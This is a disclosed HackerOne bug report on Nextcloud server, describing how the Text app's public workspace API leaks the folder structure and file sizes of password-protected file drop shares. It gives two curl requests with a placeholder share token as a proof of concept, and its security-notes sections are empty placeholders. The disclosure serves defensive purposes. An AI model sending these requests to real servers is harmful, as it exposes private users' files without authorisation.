---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1337422'
original_report_id: '1337422'
title: Folder architecture and Filesizes of private file drop shares can be getten
weakness: Information Disclosure
team_handle: nextcloud
created_at: '2021-09-12T10:40:41.266Z'
disclosed_at: '2022-04-09T13:08:38.397Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 18
asset_identifier: nextcloud/server
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Folder architecture and Filesizes of private file drop shares can be getten

## Metadata

- HackerOne Report ID: 1337422
- Weakness: Information Disclosure
- Program: nextcloud
- Disclosed At: 2022-04-09T13:08:38.397Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Steps To Reproduce:

1. Create a new Folder "TestABC"
2. Share a password protected link of this folder
3. Create a file "README.md" and a file "README.md" in the Subfolder "Subfolder".

==> curl -H "OCS-APIREQUEST: true" "http://localhost/ocs/v2.php/apps/text/public/workspace?shareToken=ABCDE12345"

==> curl -H "OCS-APIREQUEST: true" "http://localhost/ocs/v2.php/apps/text/public/workspace?shareToken=ABCDE12345&folder=subfolder"

## Impact

Folder architecture and Filesizes of private file drop shares can be getten

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
